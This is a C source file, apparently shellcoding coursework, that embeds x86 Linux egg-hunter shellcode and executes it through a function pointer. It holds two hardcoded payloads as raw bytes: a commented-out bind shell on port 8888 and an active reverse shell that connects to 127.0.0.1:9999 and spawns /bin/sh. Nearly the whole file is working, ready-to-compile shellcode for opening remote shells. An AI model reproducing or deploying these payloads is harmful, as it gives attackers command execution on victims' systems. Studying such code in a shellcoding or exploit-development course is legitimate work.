#include<stdio.h>
#include<string.h>
//Filename: Skeleton_shellcode.c
//Author: MrSquid
//Purpose: Skeleton shellcode with egg_code and 2 payloads hardcoded to generate an Egg Hunter binary

unsigned char egg_code[] = \ //Eggcode = \xa2\xa1\x6e\x7a --> This is the code which the nasm code looks for 
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\xa2\xa1\x6e\x7a\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char payload[] = \ //BInd_TCP(1) and Reverse_TCP(2) (Assignment 1 and 2)
//"\xa2\xa1\x6e\x7a\xa2\xa1\x6e\x7a\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x00\x00\x22\xb8\x6a\x02\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
"\xa2\xa1\x6e\x7a\xa2\xa1\x6e\x7a\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x27\x0f\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
//The 8 first bytes are the eggcode repetead twice

main()
{
	printf("Eggcode Length:  %d\n", strlen(egg_code));
	printf("Payload Length:  %d\n", strlen(payload));

	int (*ret)() = (int(*)())egg_code;

	ret();

}

	
/*


int(*ret)()

declares a function pointer named ret; the function takes unspecified arguments and returns an integer.

(int(*)())code

casts the code array to a function pointer of that same type.

So this converts the address of the code array to a function pointer, which then allows you to call it and execute the code.

Note that this is technically undefined behavior, so it doesn't have to work this way. But this is how practically all implementations compile this code. Shellcodes like this are not expected to be portable -- the bytes in the code array are dependent on the CPU architecture and stack frame layout.

*/
